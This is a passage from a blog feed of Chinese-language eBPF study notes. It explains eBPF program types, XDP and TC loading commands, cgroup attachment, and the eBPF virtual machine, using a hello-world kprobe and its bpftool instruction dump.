BPF_PROG_TYPE_FLOW_DISSECTOR<span class="token punctuation">,</span>  BPF_PROG_TYPE_CGROUP_SYSCTL<span class="token punctuation">,</span>  BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE<span class="token punctuation">,</span>  BPF_PROG_TYPE_CGROUP_SOCKOPT<span class="token punctuation">,</span>  BPF_PROG_TYPE_TRACING<span class="token punctuation">,</span>  BPF_PROG_TYPE_STRUCT_OPS<span class="token punctuation">,</span>  BPF_PROG_TYPE_EXT<span class="token punctuation">,</span>  BPF_PROG_TYPE_LSM<span class="token punctuation">,</span>  BPF_PROG_TYPE_SK_LOOKUP<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于具体的内核来说，因为不同内核的版本和编译配置选项不同，一个内核并不会支持所有的程序类型。你可以在命令行中执行下面的命令，来查询当前系统支持的程序类型：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bpftool feature probe <span class="token operator">|</span> <span class="token function">grep</span> program_type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后，你会得到如下的输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eBPF program_type socket_filter is availableeBPF program_type kprobe is availableeBPF program_type sched_cls is availableeBPF program_type sched_act is availableeBPF program_type tracepoint is availableeBPF program_type xdp is availableeBPF program_type perf_event is availableeBPF program_type cgroup_skb is availableeBPF program_type cgroup_sock is availableeBPF program_type lwt_in is availableeBPF program_type lwt_out is availableeBPF program_type lwt_xmit is availableeBPF program_type sock_ops is availableeBPF program_type sk_skb is availableeBPF program_type cgroup_device is availableeBPF program_type sk_msg is availableeBPF program_type raw_tracepoint is availableeBPF program_type cgroup_sock_addr is availableeBPF program_type lwt_seg6local is availableeBPF program_type lirc_mode2 is NOT availableeBPF program_type sk_reuseport is availableeBPF program_type flow_dissector is availableeBPF program_type cgroup_sysctl is availableeBPF program_type raw_tracepoint_writable is availableeBPF program_type cgroup_sockopt is availableeBPF program_type tracing is NOT availableeBPF program_type struct_ops is availableeBPF program_type ext is NOT availableeBPF program_type lsm is NOT availableeBPF program_type sk_lookup is available<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这些输出中，你可以看到当前内核支持 kprobe、xdp、perf_event 等程序类型，而不支持 ext、lsm 等程序类型。</p><p>根据具体功能和应用场景的不同，这些程序类型大致可以划分为三类：</p><ul><li>第一类是跟踪，即从内核和程序的运行状态中提取跟踪信息，来了解当前系统正在发生什么。</li><li>第二类是网络，即对网络数据包进行过滤和处理，以便了解和控制网络数据包的收发过程。</li><li>第三类是除跟踪和网络之外的其他类型，包括安全控制、BPF 扩展等等。</li></ul><p>接下来，我就带你一起分别看看，每一类 eBPF 程序都有哪些具体的类型，以及这些不同类型的程序都是由哪些事件触发执行的。</p><h2 id="跟踪类-eBPF-程序"><a href="#跟踪类-eBPF-程序" class="headerlink" title="跟踪类 eBPF 程序"></a>跟踪类 eBPF 程序</h2><p>先看第一类，也就是跟踪类 eBPF 程序。</p><p><strong>跟踪类 eBPF 程序主要用于从系统中提取跟踪信息，进而为监控、排错、性能优化等提供数据支撑</strong>。比如，我们前几讲中的 Hello World 示例就是一个 <code>BPF_PROG_TYPE_KPROBE</code> 类型的跟踪程序，它的目的是跟踪内核函数是否被某个进程调用了。</p><p>为了方便你查询，我把常见的跟踪类 BPF 程序的主要功能以及使用限制整理成了一个表格，你可以在需要时参考。</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/traceClass.png" class=""><p>这其中，KPROBE、TRACEPOINT 以及 PERF_EVENT 都是最常用的 eBPF 程序类型，大量应用于监控跟踪、性能优化以及调试排错等场景中。我们前几讲中提到的 <a class="link"   href="https://github.com/iovisor/bcc" >BCC<i class="fas fa-external-link-alt"></i></a>工具集，其中包含的绝大部分工具也都属于这个类型。</p><h2 id="网络类-eBPF-程序"><a href="#网络类-eBPF-程序" class="headerlink" title="网络类 eBPF 程序"></a>网络类 eBPF 程序</h2><p>看完跟踪类 eBPF 程序，我们再来看看网络类 eBPF 程序。</p><p><strong>网络类 eBPF 程序主要用于对网络数据包进行过滤和处理，进而实现网络的观测、过滤、流量控制以及性能优化等各种丰富的功能</strong>。根据事件触发位置的不同，网络类 eBPF 程序又可以分为 XDP（eXpress Data Path，高速数据路径）程序、TC（Traffic Control，流量控制）程序、套接字程序以及 cgroup 程序，下面我们来分别看看。</p><h2 id="XDP-程序"><a href="#XDP-程序" class="headerlink" title="XDP 程序"></a>XDP 程序</h2><p>XDP 程序的类型定义为 <code>BPF_PROG_TYPE_XDP</code>，它在<strong>网络驱动程序刚刚收到数据包时</strong>触发执行。由于无需通过繁杂的内核网络协议栈，XDP 程序可用来实现高性能的网络处理方案，常用于 DDoS 防御、防火墙、4 层负载均衡等场景。</p><p>你需要注意，XDP 程序并不是绕过了内核协议栈，它只是在内核协议栈之前处理数据包，而处理过的数据包还可以正常通过内核协议栈继续处理。你可以通过下面的图片（图片来自 iovisor.org）加深对  XDP 相对内核协议栈位置的理解：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/XDP.png" class=""><p>根据网卡和网卡驱动是否原生支持 XDP 程序，XDP 运行模式可以分为下面这三种：</p><ul><li>通用模式。它不需要网卡和网卡驱动的支持，XDP 程序像常规的网络协议栈一样运行在内核中，性能相对较差，一般用于测试；</li><li>原生模式。它需要网卡驱动程序的支持，XDP 程序在网卡驱动程序的早期路径运行；</li><li>卸载模式。它需要网卡固件支持 XDP 卸载，XDP 程序直接运行在网卡上，而不再需要消耗主机的 CPU 资源，具有最好的性能。</li></ul><p>无论哪种模式，XDP 程序在处理过网络包之后，都需要根据 eBPF 程序执行结果，决定数据包的去处。这些执行结果对应以下 5 种 XDP 程序结果码：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/FiveResultCodeXDP.png" class=""><p>通常来说，XDP 程序通过 <code>ip link</code> 命令加载到具体的网卡上，加载格式为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth1 为网卡名</span><span class="token comment"># xdpgeneric 设置运行模式为通用模式</span><span class="token comment"># xdp-example.o 为编译后的 XDP 字节码</span><span class="token function">sudo</span> <span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> dev eth1 xdpgeneric object xdp-example.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而卸载 XDP 程序也是通过 <code>ip link</code> 命令，具体参数如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> veth1 xdpgeneric off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除了 <code>ip link</code> 之外， BCC 也提供了方便的库函数，让我们可以在同一个程序中管理 XDP 程序的生命周期：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bcc <span class="token keyword">import</span> BPF<span class="token comment"># 编译XDP程序</span>b <span class="token operator">=</span> BPF<span class="token punctuation">(</span>src_file<span class="token operator">=</span><span class="token string">"xdp-example.c"</span><span class="token punctuation">)</span>fn <span class="token operator">=</span> b<span class="token punctuation">.</span>load_func<span class="token punctuation">(</span><span class="token string">"xdp-example"</span><span class="token punctuation">,</span> BPF<span class="token punctuation">.</span>XDP<span class="token punctuation">)</span><span class="token comment"># 加载XDP程序到eth0网卡</span>device <span class="token operator">=</span> <span class="token string">"eth0"</span>b<span class="token punctuation">.</span>attach_xdp<span class="token punctuation">(</span>device<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># 其他处理逻辑</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment"># 卸载XDP程序</span>b<span class="token punctuation">.</span>remove_xdp<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TC-程序"><a href="#TC-程序" class="headerlink" title="TC 程序"></a>TC 程序</h2><p>TC 程序的类型定义为 <code>BPF_PROG_TYPE_SCHED_CLS</code> 和 <code>BPF_PROG_TYPE_SCHED_ACT</code>，分别作为 <a class="link"   href="https://tldp.org/HOWTO/Traffic-Control-HOWTO/index.html" >Linux 流量控制<i class="fas fa-external-link-alt"></i></a> 的分类器和执行器。Linux 流量控制通过网卡队列、排队规则、分类器、过滤器以及执行器等，实现了对网络流量的整形调度和带宽控制。</p><p>下图（图片来自 linux-ip.net）展示了  HTB（Hierarchical Token Bucket，层级令牌桶）流量控制的工作原理：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/HTBucketOri.png" class=""><p>得益于内核 v4.4 引入的 <a class="link"   href="https://docs.cilium.io/en/v1.8/bpf/#tc-traffic-control" >direct-action<i class="fas fa-external-link-alt"></i></a> 模式，TC 程序可以直接在一个程序内完成分类和执行的动作，而无需再调用其他的 TC 排队规则和分类器，具体如下图所示：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/TCProgram.png" class=""><p>同 XDP 程序相比，TC 程序可以<strong>直接获取内核解析后的网络报文数据结构</strong> <code>sk_buff</code>（XDP 则是 <code>xdp_buff</code>），并且可在网卡的接收和发送两个方向上执行（XDP 则只能用于接收）。下面我们来具体看看  TC 程序的执行位置：</p><ul><li>对于接收的网络包，TC 程序在网卡接收（GRO）之后、协议栈处理（包括 IP 层处理和 iptables 等）之前执行；</li><li>对于发送的网络包，TC 程序在协议栈处理（包括 IP 层处理和 iptables 等）之后、数据包发送到网卡队列（GSO）之前执行。</li></ul><p>除此之外，由于 TC 运行在内核协议栈中，不需要网卡驱动程序做任何改动，因而可以挂载到任意类型的网卡设备（包括容器等使用的虚拟网卡）上。</p><p>同 XDP 程序一样，TC eBPF 程序也可以通过 Linux 命令行工具来加载到网卡上，不过相应的工具要换成 tc。你可以通过下面的命令，分别加载接收和发送方向的 eBPF 程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建 clsact 类型的排队规则</span><span class="token function">sudo</span> tc qdisc <span class="token function">add</span> dev eth0 clsact<span class="token comment"># 加载接收方向的 eBPF 程序</span><span class="token function">sudo</span> tc filter <span class="token function">add</span> dev eth0 ingress bpf da obj tc-example.o sec ingress<span class="token comment"># 加载发送方向的 eBPF 程序</span><span class="token function">sudo</span> tc filter <span class="token function">add</span> dev eth0 egress bpf da obj tc-example.o sec egress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="套接字程序"><a href="#套接字程序" class="headerlink" title="套接字程序"></a>套接字程序</h2><p>套接字程序用于过滤、观测或重定向套接字网络包，具体的种类也比较丰富。根据类型的不同，套接字 eBPF 程序可以挂载到套接字（socket）、控制组（cgroup ）以及网络命名空间（netns）等各个位置。你可以根据具体的应用场景，选择一个或组合多个类型的 eBPF 程序，去控制套接字的网络包收发过程。</p><p>这里，我把常见的套接字程序类型，以及它们的应用场景和挂载方法整理成了一个表格，你可以在需要时参考：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/socket.png" class=""><h2 id="cgroup-程序"><a href="#cgroup-程序" class="headerlink" title="cgroup 程序"></a>cgroup 程序</h2><p>cgroup 程序用于<strong>对 cgroup 内所有进程的网络过滤、套接字选项以及转发等进行动态控制</strong>，它最典型的应用场景是对容器中运行的多个进程进行网络控制。</p><p>cgroup 程序的种类比较丰富，我也帮你整理了一个表格，方便你在需要时查询：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/cgroup.png" class=""><p>这些类型的 BPF 程序都可以通过 BPF 系统调用的 <code>BPF_PROG_ATTACH</code> 命令来进行挂载，并设置挂载类型为匹配的 <code>BPF_CGROUP_xxx</code> 类型。比如，在挂载 <code>BPF_PROG_TYPE_CGROUP_DEVICE</code> 类型的 BPF 程序时，需要设置 <code>bpf_attach_type</code> 为 <code>BPF_CGROUP_DEVICE</code>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> bpf_attr attr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>attr<span class="token punctuation">.</span>target_fd <span class="token operator">=</span> target_fd<span class="token punctuation">;</span>            <span class="token comment">// cgroup文件描述符</span>attr<span class="token punctuation">.</span>attach_bpf_fd <span class="token operator">=</span> prog_fd<span class="token punctuation">;</span>          <span class="token comment">// BPF程序文件描述符</span>attr<span class="token punctuation">.</span>attach_type <span class="token operator">=</span> BPF_CGROUP_DEVICE<span class="token punctuation">;</span>  <span class="token comment">// 挂载类型为BPF_CGROUP_DEVICE</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bpf</span><span class="token punctuation">(</span>BPF_PROG_ATTACH<span class="token punctuation">,</span> <span class="token operator">&amp;</span>attr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token operator">-</span>errno<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，这几类网络 eBPF 程序是在不同的事件触发时执行的，因此，在实际应用中我们通常可以把多个类型的 eBPF 程序结合起来，一起使用，来实现复杂的网络控制功能。比如，最流行的 Kubernetes 网络方案 Cilium 就大量使用了 XDP、TC 和套接字 eBPF 程序，如下图（图片来自 Cilium 官方文档，图中黄色部分即为 Cilium eBPF 程序）所示：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/CiliumeBPF.png" class=""><h2 id="其他类-eBPF-程序"><a href="#其他类-eBPF-程序" class="headerlink" title="其他类 eBPF 程序"></a>其他类 eBPF 程序</h2><p>除了上面的跟踪和网络 eBPF 程序之外，Linux 内核还支持很多其他的类型。这些类型的 eBPF 程序虽然不太常用，但在需要的时候也可以帮你解决很多特定的问题。</p><p>我将这些无法划分到网络和跟踪的 eBPF 程序都归为其他类，并帮你整理了一个表格：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/OthereBPF.png" class=""><p>这个表格列出了一些不太常用的 eBPF 程序类型，可以先大致浏览下，在需要的时候再去深入了解。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>根据具体功能和应用场景的不同，我们可以把 eBPF 程序分为跟踪、网络和其他三类：</p><ul><li>跟踪类 eBPF 程序主要用于从系统中提取跟踪信息，进而为监控、排错、性能优化等提供数据支撑；</li><li>网络类 eBPF 程序主要用于对网络数据包进行过滤和处理，进而实现网络的观测、过滤、流量控制以及性能优化等；</li><li>其他类则包含了跟踪和网络之外的其他  eBPF  程序类型，如安全控制、BPF 扩展等。</li></ul><p>虽然每个 eBPF 程序都有特定的类型和触发事件，但这并不意味着它们都是完全独立的。通过 BPF 映射提供的状态共享机制，各种不同类型的 eBPF 程序完全可以相互配合，不仅可以绕过单个 eBPF 程序指令数量<br>的限制，还可以实现更为复杂的控制逻辑。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术和实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;各类 eBPF 程序的触发机制及其应用场景，eBPF 学习（三）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 运行原理</title>
    <link href="https://drun1baby.github.io/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/"/>
    <id>https://drun1baby.github.io/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/</id>
    <published>2023-08-03T14:48:30.000Z</published>
    <updated>2023-08-06T06:03:01.838Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 运行原理，eBPF 学习（二）</p><span id="more"></span><h1 id="eBPF-运行原理篇"><a href="#eBPF-运行原理篇" class="headerlink" title="eBPF 运行原理篇"></a>eBPF 运行原理篇</h1><h2 id="eBPF-虚拟机是如何工作的"><a href="#eBPF-虚拟机是如何工作的" class="headerlink" title="eBPF 虚拟机是如何工作的"></a>eBPF 虚拟机是如何工作的</h2><h3 id="eBPF-的五个模块"><a href="#eBPF-的五个模块" class="headerlink" title="eBPF 的五个模块"></a>eBPF 的五个模块</h3><p>eBPF 是一个运行在内核中的虚拟机，很多人在初次接触它时，会把它跟系统虚拟化（比如 kvm）中的虚拟机弄混。其实，虽然都被称为“虚拟机”，系统虚拟化和 eBPF 虚拟机还是有着本质不同的。</p><p>系统虚拟化基于 x86 或 arm64 等通用指令集，这些指令集足以完成完整计算机的所有功能。而为了确保在内核中安全地执行，eBPF 只提供了非常有限的指令集。这些指令集可用于完成一部分内核的功能，但却远不足以模拟完整的计算机。为了更高效地与内核进行交互，eBPF 指令还有意采用了 C 调用约定，其提供的辅助函数可以在 C 语言中直接调用，极大地方便了 eBPF 程序的开发。</p><p>如下图（图片来自 BPF Internals）所示，eBPF 在内核中的运行时主要由 5 个模块组成：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/RunningeBPF.png" class=""><ul><li>第一个模块是  <strong>eBPF 辅助函数</strong>。它提供了一系列用于 eBPF 程序与内核其他模块进行交互的函数。这些函数并不是任意一个 eBPF 程序都可以调用的，具体可用的函数集由 BPF 程序类型决定。</li><li>第二个模块是  <strong>eBPF 验证器</strong>。它用于确保 eBPF 程序的安全。验证器会将待执行的指令创建为一个有向无环图（DAG），确保程序中不包含不可达指令；接着再模拟指令的执行过程，确保不会执行无效指令。</li><li>第三个模块是由  <strong>11 个 64 位寄存器、一个程序计数器和一个 512 字节的栈组成的存储模块</strong>。这个模块用于控制 eBPF 程序的执行。其中，R0 寄存器用于存储函数调用和 eBPF 程序的返回值，这意味着函数调用最多只能有一个返回值；R1-R5 寄存器用于函数调用的参数，因此函数调用的参数最多不能超过 5 个；而 R10 则是一个只读寄存器，用于从栈中读取数据。</li><li>第四个模块是即时编译器，它将 eBPF 字节码编译成本地机器指令，以便更高效地在内核中执行。</li><li>第五个模块是  BPF 映射（map），它用于提供大块的存储。这些存储可被用户空间程序用来进行访问，进而控制 eBPF 程序的运行状态。</li></ul><p>关于 BPF 辅助函数和 BPF 映射的具体内容我会放在后续的文章里面详细编写，现在我们先来看看 BPF 指令的具体格式，以及它是如何加载到内核中，又是何时运行的。</p><h3 id="BPF-指令是什么样的"><a href="#BPF-指令是什么样的" class="headerlink" title="BPF 指令是什么样的"></a>BPF 指令是什么样的</h3><p>用上一讲的 Hello World 作为例子，一起看下 BPF 指令到底是什么样子的。</p><p>它的逻辑其实很简单，先调用    bpf_trace_printk  输出一个 “Hello, World!” 字符串，然后就返回成功了：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">bpf_trace_printk</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，我们通过 BCC 的 Python 库，加载并运行了这个 eBPF 程序：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># This is a Hello World example of BPF.</span><span class="token keyword">from</span> bcc <span class="token keyword">import</span> BPF<span class="token comment"># load BPF program</span>b <span class="token operator">=</span> BPF<span class="token punctuation">(</span>src_file<span class="token operator">=</span><span class="token string">"hello.c"</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span>attach_kprobe<span class="token punctuation">(</span>event<span class="token operator">=</span><span class="token string">"do_sys_openat2"</span><span class="token punctuation">,</span> fn_name<span class="token operator">=</span><span class="token string">"hello_world"</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span>trace_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端中运行下面的命令，就可以启动这个 eBPF 程序（注意， BCC 帮你完成了编译和加载的过程）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 hello.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来我们使用一个新的工具 bpftool，用它可以查看 eBPF 程序的运行状态。</p><p>首先，打开一个新的终端，执行下面的命令，查询系统中正在运行的 eBPF 程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> bpftool prog list<span class="token number">579</span>: kprobe  name hello_world  tag 38dd440716c4900f  gpl        loaded_at <span class="token number">2023</span>-08-06T09:01:22+0800  uid <span class="token number">0</span>        xlated 104B  jited 70B  memlock 4096B        btf_id <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/bpftoolList.png" class=""><p>输出中，579 是这个 eBPF 程序的编号，kprobe 是程序的类型，而 hello_world 是程序的名字。</p><p>有了 eBPF 程序编号之后，执行下面的命令就可以导出这个 eBPF 程序的指令（注意把 579 替换成你查询到的编号）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> bpftool prog dump xlated <span class="token function">id</span> <span class="token number">579</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里有个小坑，需要自己手动编译 libelf-dev 的源码，具体见 <a class="link"   href="https://blog.csdn.net/Withdraw_end/article/details/132127777" >https://blog.csdn.net/Withdraw_end/article/details/132127777<i class="fas fa-external-link-alt"></i></a> </p><p>输出结果</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> ctx<span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span>   <span class="token number">0</span><span class="token operator">:</span> <span class="token punctuation">(</span>b7<span class="token punctuation">)</span> r1 <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token keyword">char</span> _fmt<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">;</span> <span class="token function">bpf_trace_printk_</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">1</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">6</span>b<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">(</span>u16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>r10 <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> r1   <span class="token number">2</span><span class="token operator">:</span> <span class="token punctuation">(</span>b7<span class="token punctuation">)</span> r1 <span class="token operator">=</span> <span class="token number">1684828783</span>   <span class="token number">3</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">(</span>u32 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>r10 <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> r1   <span class="token number">4</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span> r1 <span class="token operator">=</span> <span class="token number">0x57202c6f6c6c6548</span>   <span class="token number">6</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">7</span>b<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">(</span>u64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>r10 <span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> r1   <span class="token number">7</span><span class="token operator">:</span> <span class="token punctuation">(</span>bf<span class="token punctuation">)</span> r1 <span class="token operator">=</span> r10<span class="token punctuation">;</span>    <span class="token number">8</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">07</span><span class="token punctuation">)</span> r1 <span class="token operator">+=</span> <span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token keyword">char</span> _fmt<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">;</span> <span class="token function">bpf_trace_printk_</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">9</span><span class="token operator">:</span> <span class="token punctuation">(</span>b7<span class="token punctuation">)</span> r2 <span class="token operator">=</span> <span class="token number">14</span>  <span class="token number">10</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">85</span><span class="token punctuation">)</span> call bpf_trace_printk#<span class="token operator">-</span><span class="token number">58800</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token number">11</span><span class="token operator">:</span> <span class="token punctuation">(</span>b7<span class="token punctuation">)</span> r0 <span class="token operator">=</span> <span class="token number">0</span>  <span class="token number">12</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span> exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/outputOrder580.png" class=""><p>其中，分号开头的部分，正是我们前面写的 C 代码，而其他行则是具体的 BPF 指令。具体每一行的 BPF 指令又分为三部分：</p><ul><li>第一部分，冒号前面的数字 0-12 ，代表 BPF 指令行数；</li><li>第二部分，括号中的 16 进制数值，表示 BPF 